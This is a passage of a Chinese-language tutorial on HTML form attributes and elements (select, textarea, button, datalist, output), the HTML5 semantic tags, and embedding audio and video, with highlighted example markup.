class="token tag"><span class="token punctuation">&lt;</span>form</span> <span class="token attr-name">action</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>#<span class="token punctuation">"</span></span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>form1<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>   First name: <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>text<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>fname<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">></span></span>   <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>submit<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>Submit<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">></span></span> Last name: <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>text<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>lname<span class="token punctuation">"</span></span> <span class="token attr-name">form</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>form1<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></code></pre><p>上面这里的<code>lname</code>同样会作为<code>form1</code>表单的一个参数提交给服务器。</p><h4 id="formaction"><a href="#formaction" class="headerlink" title="formaction"></a>formaction</h4><p>formaction 属性规定当提交表单时处理该输入控件的文件的 URL。</p><p>formaction 属性覆盖 <code>&lt;form&gt;</code> 元素的 <code>action</code> 属性。</p><p>适用于 type=”submit” 以及 type=”image”。</p><p>比如可以给单独一个按钮指定不同的提交路径。</p><pre class=" language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span> <span class="token attr-name">action</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>/example/html5/demo_form.asp<span class="token punctuation">"</span></span> <span class="token attr-name">method</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>get<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>First name: <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>text<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>fname<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span> <span class="token punctuation">/></span></span>Last name: <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>text<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>lname<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span> <span class="token punctuation">/></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>submit<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>提交<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span> <span class="token punctuation">/></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>submit<span class="token punctuation">"</span></span> <span class="token attr-name">formaction</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>/example/html5/demo_admin.asp<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>以管理员身份提交<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">></span></span></code></pre><h4 id="formmethod"><a href="#formmethod" class="headerlink" title="formmethod"></a>formmethod</h4><p>定义用以向 action URL 发送表单数据（form-data）的 HTTP 方法。</p><p>formmethod 属性覆盖 <code>&lt;form&gt;</code> 元素的 method 属性。</p><p>适用于 type=”submit” 以及 type=”image”。</p><p>可以改变提交的方式。</p><pre class=" language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span> <span class="token attr-name">action</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>#<span class="token punctuation">"</span></span> <span class="token attr-name">method</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>get<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>   First name: <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>text<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>fname<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">></span></span>   Last name: <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>text<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>lname<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">></span></span>   <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>submit<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>Submit<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>   <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>submit<span class="token punctuation">"</span></span> <span class="token attr-name">formmethod</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>post<span class="token punctuation">"</span></span> <span class="token attr-name">formaction</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>#<span class="token punctuation">"</span></span>   <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>Submit using POST<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">></span></span> </code></pre><h4 id="formtarget"><a href="#formtarget" class="headerlink" title="formtarget"></a>formtarget</h4><p>规定的名称或关键词指示提交表单后在何处显示接收到的响应。</p><p>会覆盖 <code>&lt;form&gt;</code> 元素的 target 属性。可与 type=”submit” 和 type=”image” 使用。</p><p>比如指定某个按钮在新的页面打开。</p><pre class=" language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span> <span class="token attr-name">action</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>action_page.php<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>   First name: <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>text<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>fname<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">></span></span>   Last name: <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>text<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>lname<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">></span></span>   <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>submit<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>Submit as normal<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>   <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>submit<span class="token punctuation">"</span></span> <span class="token attr-name">formtarget</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>_blank<span class="token punctuation">"</span></span>   <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>Submit to a new window<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">></span></span> </code></pre><h4 id="formenctype"><a href="#formenctype" class="headerlink" title="formenctype"></a>formenctype</h4><p>定当把表单数据（form-data）提交至服务器时如何对其进行编码（仅针对 method=”post” 的表单）。</p><p>覆盖 <code>&lt;form&gt;</code> 元素的 enctype 属性。</p><h4 id="formnovalidate"><a href="#formnovalidate" class="headerlink" title="formnovalidate"></a>formnovalidate</h4><p>布尔属性。如果设置，则规定在提交表单时不对 <code>&lt;input&gt;</code> 元素进行验证。</p><p>覆盖 <code>&lt;form&gt;</code> 元素的 novalidate 属性。可用于 type=”submit”。</p><hr><p>噗，终于看完 input 元素的属性了，真的多emmm</p><p>下面接着看其他的表单元素吧。</p><h3 id="select-元素-下拉列表"><a href="#select-元素-下拉列表" class="headerlink" title="select 元素 下拉列表"></a>select 元素 下拉列表</h3><p><code>&lt;select&gt;</code> 定义<strong>下拉列表</strong>，<code>&lt;option&gt;</code> 元素定义<strong>待选择的选项</strong>。</p><p>列表通常会把首个选项显示为被选选项。</p><p>可以通过添加 <code>selected</code> 属性来定义预定义选项。</p><pre class=" language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>select</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>cars<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>option</span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>volvo<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>Volvo<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>option</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>option</span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>saab<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>Saab<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>option</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>option</span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>fiat<span class="token punctuation">"</span></span> <span class="token attr-name">selected</span><span class="token punctuation">></span></span>Fiat<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>option</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>option</span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>audi<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>Audi<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>option</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>select</span><span class="token punctuation">></span></span></code></pre><select name="cars"><option value="volvo">Volvo</option><option value="saab">Saab</option><option value="fiat" selected="">Fiat</option><option value="audi">Audi</option></select><br><h3 id="textarea-元素-文本域"><a href="#textarea-元素-文本域" class="headerlink" title="textarea 元素 文本域"></a>textarea 元素 文本域</h3><p>定义多行输入字段（<em>文本域</em>）。</p><pre class=" language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>textarea</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>message<span class="token punctuation">"</span></span> <span class="token attr-name">rows</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>10<span class="token punctuation">"</span></span> <span class="token attr-name">cols</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>30<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>The cat was playing in the garden.<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>textarea</span><span class="token punctuation">></span></span></code></pre><textarea name="message" rows="10" cols="30">The cat was playing in the garden.</textarea><br><p>上面这里指定了默认情况下一行30个字符，一列10个字符。注意一行里一个汉字算作2个字符哒。</p><h3 id="button-元素-按钮"><a href="#button-元素-按钮" class="headerlink" title="button 元素 按钮"></a>button 元素 按钮</h3><p>定义可点击的<em>按钮</em>。具体再指定相应的动作。</p><p>这个和 <code>&lt;input type="button"&gt;</code> 效果类似。</p><pre class=" language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>button</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>button<span class="token punctuation">"</span></span> <span class="token attr-name">onclick</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>alert(<span class="token punctuation">'</span>Hello World!<span class="token punctuation">'</span>)<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>Click Me!<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>button</span><span class="token punctuation">></span></span></code></pre><p><button type="button" onclick="alert('Hello World!')">Click Me!</button><br><br></p><hr><p>下面是 HTML5 新增的元素</p><p><code>&lt;datalist&gt;</code>  <code>&lt;keygen&gt;</code>  <code>&lt;output&gt;</code></p><table><thead><tr><th>标签</th><th>描述</th></tr></thead><tbody><tr><td><code>&lt;datalist&gt;</code></td><td>定义输入控件的预定义选项。</td></tr><tr><td><code>&lt;keygen&gt;</code></td><td>定义键对生成器字段（用于表单）。</td></tr><tr><td><code>&lt;output&gt;</code></td><td>定义计算结果。</td></tr></tbody></table><h3 id="datalist-元素-预定义选项列表"><a href="#datalist-元素-预定义选项列表" class="headerlink" title="datalist 元素 预定义选项列表"></a>datalist 元素 预定义选项列表</h3><p>规定预定义选项列表。</p><p>用户会在他们输入数据时看到预定义选项的下拉列表。</p><p><code>&lt;input&gt;</code> 元素的 <em>list</em> 属性必须引用 <code>&lt;datalist&gt;</code> 元素的 <em>id</em> 属性。</p><pre class=" language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">list</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>browsers<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>datalist</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>browsers<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>   <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>option</span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>Internet Explorer<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>   <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>option</span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>Firefox<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>   <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>option</span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>Chrome<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>   <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>option</span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>Opera<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>   <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>option</span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>Safari<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>datalist</span><span class="token punctuation">></span></span> </code></pre><input list="browsers"><datalist id="browsers">   <option value="Internet Explorer">   </option><option value="Firefox">   </option><option value="Chrome">   </option><option value="Opera">   </option><option value="Safari"></option></datalist> <p>上面的input元素的属性里也提到了。</p><br><h3 id="output-元素"><a href="#output-元素" class="headerlink" title="output 元素"></a>output 元素</h3><p>作为计算结果输出显示(比如执行脚本的输出)。</p><table><thead><tr><th>属性</th><th>值</th><th>描述</th></tr></thead><tbody><tr><td>for</td><td><em>element_id</em></td><td>描述计算中使用的元素与计算结果之间的关系。</td></tr><tr><td>form</td><td><em>form_id</em></td><td>定义输入字段所属的一个或多个表单。</td></tr><tr><td>name</td><td><em>name</em></td><td>定义对象的唯一名称（表单提交时使用）。</td></tr></tbody></table><pre class=" language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span> <span class="token attr-name">oninput</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>x.value<span class="token punctuation">=</span>parseInt(a.value)+parseInt(b.value)<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>0<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>range<span class="token punctuation">"</span></span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>a<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>50<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>100+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>number<span class="token punctuation">"</span></span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>b<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>50<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>=<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>output</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>x<span class="token punctuation">"</span></span> <span class="token attr-name">for</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>a b<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>output</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">></span></span></code></pre><form oninput="x.value=parseInt(a.value)+parseInt(b.value)">0<input type="range" id="a" value="50">100+<input type="number" id="b" value="50">=<output name="x" for="a b"></output></form><br><hr><br><h2 id="H5-中的语义元素"><a href="#H5-中的语义元素" class="headerlink" title="H5 中的语义元素"></a>H5 中的语义元素</h2><table><thead><tr><th>标签</th><th>描述</th></tr></thead><tbody><tr><td><code>&lt;article&gt;</code></td><td>定义文章。</td></tr><tr><td><code>&lt;aside&gt;</code></td><td>定义页面内容以外的内容。</td></tr><tr><td><code>&lt;details&gt;</code></td><td>定义用户能够查看或隐藏的额外细节。</td></tr><tr><td><code>&lt;figcaption&gt;</code></td><td>定义 <code>&lt;figure&gt;</code> 元素的标题。</td></tr><tr><td><code>&lt;figure&gt;</code></td><td>规定自包含内容，比如图示、图表、照片、代码清单等。</td></tr><tr><td><code>&lt;footer&gt;</code></td><td>定义文档或节的页脚。</td></tr><tr><td><code>&lt;header&gt;</code></td><td>规定文档或节的页眉。</td></tr><tr><td><code>&lt;main&gt;</code></td><td>规定文档的主内容。</td></tr><tr><td><code>&lt;mark&gt;</code></td><td>定义重要的或强调的文本。</td></tr><tr><td><code>&lt;nav&gt;</code></td><td>定义导航链接。</td></tr><tr><td><code>&lt;section&gt;</code></td><td>定义文档中的节。</td></tr><tr><td><code>&lt;summary&gt;</code></td><td>定义 <code>&lt;details&gt;</code> 元素的可见标题。</td></tr><tr><td><code>&lt;time&gt;</code></td><td>定义日期/时间。</td></tr></tbody></table><h2 id="多媒体"><a href="#多媒体" class="headerlink" title="多媒体"></a>多媒体</h2><p>Web 上的多媒体指的是音效、音乐、视频和动画等。</p><h3 id="object-元素"><a href="#object-元素" class="headerlink" title="object 元素"></a>object 元素</h3><p><code>&lt;object&gt;</code> 的作用是支持 HTML 助手（插件）。</p><p>辅助应用程序（helper application）是可由浏览器启动的程序，也称为插件。</p><p>辅助程序可用于播放音频和视频（以及其他）。辅助程序是使用 <code>&lt;object&gt;</code> 标签来加载的。</p><h3 id="音频"><a href="#音频" class="headerlink" title="音频"></a>音频</h3><p>有这几种方案：</p><p>可以使用插件、使用<code>&lt;embed&gt;</code>元素、使用 <code>&lt;object&gt;</code> 元素、使用 HTML5 <code>&lt;audio&gt;</code> 元素等。</p><h4 id="使用-lt-embed-gt-元素"><a href="#使用-lt-embed-gt-元素" class="headerlink" title="使用<embed>元素"></a>使用<code>&lt;embed&gt;</code>元素</h4><pre class=" language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>embed</span> <span class="token attr-name">height</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>100<span class="token punctuation">"</span></span> <span class="token attr-name">width</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>100<span class="token punctuation">"</span></span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>song.mp3<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span></code></pre><h4 id="使用-lt-object-gt-元素"><a href="#使用-lt-object-gt-元素" class="headerlink" title="使用 <object> 元素"></a>使用 <code>&lt;object&gt;</code> 元素</h4><pre class=" language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>object</span> <span class="token attr-name">height</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>100<span class="token punctuation">"</span></span> <span class="token attr-name">width</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>100<span class="token punctuation">"</span></span> <span class="token attr-name">data</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>song.mp3<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>object</span><span class="token punctuation">></span></span></code></pre><h4 id="使用-HTML5-lt-audio-gt-元素"><a href="#使用-HTML5-lt-audio-gt-元素" class="headerlink" title="使用 HTML5 <audio> 元素"></a>使用 HTML5 <code>&lt;audio&gt;</code> 元素</h4><pre class=" language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>audio</span> <span class="token attr-name">controls</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>controls<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>source</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>song.mp3<span class="token punctuation">"</span></span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>audio/mp3<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>source</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>song.ogg<span class="token punctuation">"</span></span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>audio/ogg<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span>Your browser does not support this audio format.<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>audio</span><span class="token punctuation">></span></span></code></pre><p>这里定义了一个备选文件源，当<code>.mp3</code> 失效或浏览器不支持时，可以调用 <code>.ogg</code> 的文件。浏览器将使用第一个可识别的格式。</p><p>若浏览器不支持<code>audio</code>元素的话，则会显示 <code>Your browser does not support this audio format.</code></p><p><code>audio</code>元素有如下的属性：</p><table><thead><tr><th>属性</th><th>值</th><th>描述</th></tr></thead><tbody><tr><td>autoplay</td><td>autoplay</td><td>如果出现该属性，则音频在就绪后马上播放。</td></tr><tr><td>controls</td><td>controls</td><td>如果出现该属性，则向用户显示控件，比如播放按钮。</td></tr><tr><td>loop</td><td>loop</td><td>如果出现该属性，则每当音频结束时重新开始播放。</td></tr><tr><td>preload</td><td>preload</td><td>如果出现该属性，则音频在页面加载时进行加载，并预备播放。如果使用 “autoplay”，则忽略该属性。</td></tr><tr><td>src</td><td><em>url</em></td><td>要播放的音频的 URL。</td></tr></tbody></table><h4 id="更好的方案"><a href="#更好的方案" class="headerlink" title="更好的方案"></a>更好的方案</h4><p><code>&lt;audio&gt;</code> 元素会尝试以 mp3 或 ogg 来播放音频。如果失败，代码将回退尝试 <code>&lt;embed&gt;</code> 元素。</p><pre class=" language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>audio</span> <span class="token attr-name">controls</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>controls<span class="token punctuation">"</span></span> <span class="token attr-name">height</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>100<span class="token punctuation">"</span></span> <span class="token attr-name">width</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>100<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>source</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>song.mp3<span class="token punctuation">"</span></span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>audio/mp3<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>source</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>song.ogg<span class="token punctuation">"</span></span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>audio/ogg<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>embed</span> <span class="token attr-name">height</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>100<span class="token punctuation">"</span></span> <span class="token attr-name">width</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>100<span class="token punctuation">"</span></span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>song.mp3<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>audio</span><span class="token punctuation">></span></span></code></pre><h4 id="使用超链接"><a href="#使用超链接" class="headerlink" title="使用超链接"></a>使用超链接</h4><p>实在不行，就直接用 <code>a</code> 链接标签吧。</p><p>点击该链接，浏览器会启动“辅助应用程序”来播放该文件。也可能会弹出文件下载界面。</p><pre class=" language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>song.mp3<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>Play the sound<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a</span><span class="token punctuation">></span></span></code></pre><hr><h3 id="视频"><a href="#视频" class="headerlink" title="视频"></a>视频</h3><p>和音频类似，也可以用<code>&lt;embed&gt;</code>元素、<code>&lt;object&gt;</code> 元素、HTML5 <code>&lt;video&gt;</code> 元素、超链接等。</p><p>只是把相应的源（src、data、href等）修改为视频地址即可。</p><h4 